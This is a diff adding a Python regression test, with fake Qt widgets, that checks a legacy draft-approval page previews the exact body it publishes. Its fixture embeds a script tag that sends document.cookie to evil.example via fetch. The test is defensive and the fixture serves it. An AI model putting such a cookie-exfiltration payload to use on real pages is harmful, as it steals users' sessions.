@@ -235,6 +235,91 @@ def test_workbench_render_body_passes_the_content_html():
             in inspect.getsource(expand_overlay.ExpandOverlay._render_preview))
 
 
+class _FakeItem:
+    """A QTableWidgetItem stand-in — _on_draft_selected only reads these."""
+
+    def __init__(self, text="", data=None):
+        self._text, self._data = text, data
+
+    def text(self):
+        return self._text
+
+    def data(self, role):
+        return self._data
+
+
+class _FakeTable:
+    def __init__(self, items):
+        self._items = items
+
+    def item(self, row, col):
+        return self._items.get((row, col))
+
+
+class _FakeButton:
+    def __init__(self):
+        self.enabled = None
+
+    def setEnabled(self, value):
+        self.enabled = value
+
+
+class _FakePreview:
+    def __init__(self):
+        self.text = None
+
+    def setPlainText(self, value):
+        self.text = value
+
+
+class _FakePipeline:
+    def __init__(self, draft):
+        self._draft = draft
+
+    def _get_draft(self, draft_id):
+        return self._draft
+
+
+def test_legacy_guru_page_preview_is_the_publish_body(matrix):
+    """C4, on the LEGACY approval surface.
+
+    ``guru_page`` previewed ``draft["content"]`` — the markdown COLUMN — while
+    ``guru_content_pipeline.approve_and_push`` shipped ``publish_body(draft)``.
+    Observed: the reviewer read "Benign markdown the reviewer reads." and a
+    <script> in ``content_html`` went out over the wire. Called with a fake
+    self so no Qt widget tree is needed; duck typing is the whole point.
+    """
+    from src.ui.pages.guru_page import GuruPage
+    conn, _shapes = matrix
+    hostile = ('<p>Benign markdown the reviewer reads.</p>'
+               '<script>fetch("https://evil.example/"+document.cookie)</script>')
+    did = store.save_card_draft(conn, title="Legacy",
+                                content="Benign markdown the reviewer reads.")
+    store.update_draft_content(conn, did,
+                               content="Benign markdown the reviewer reads.",
+                               content_html=hostile)
+    draft = store.get_draft(conn, did)
+
+    from PySide6.QtCore import Qt
+    page = type("FakeGuruPage", (), {})()
+    page._drafts_table = _FakeTable({
+        (0, 0): _FakeItem("Legacy", did),
+        (0, 3): _FakeItem("PENDING"),
+    })
+    page._approve_btn, page._reject_btn = _FakeButton(), _FakeButton()
+    page._draft_preview = _FakePreview()
+    page._content_pipeline = _FakePipeline(draft)
+    page._current_draft_id = None
+    assert Qt.ItemDataRole.UserRole is not None   # the role the id rides on
+
+    GuruPage._on_draft_selected(page, 0, 0, -1, -1)
+
+    assert page._draft_preview.text == store.publish_body(draft)
+    assert "evil.example" in page._draft_preview.text, (
+        "the shipped bytes must be on the surface that gates the push")
+    assert page._draft_preview.text != (draft.get("content") or "")
+
+
 def test_web_preview_is_the_sanitized_publish_body(matrix):
     from src.data.html_sanitize import sanitize_html
     from src.services.enablement_web import WorkbenchWebController
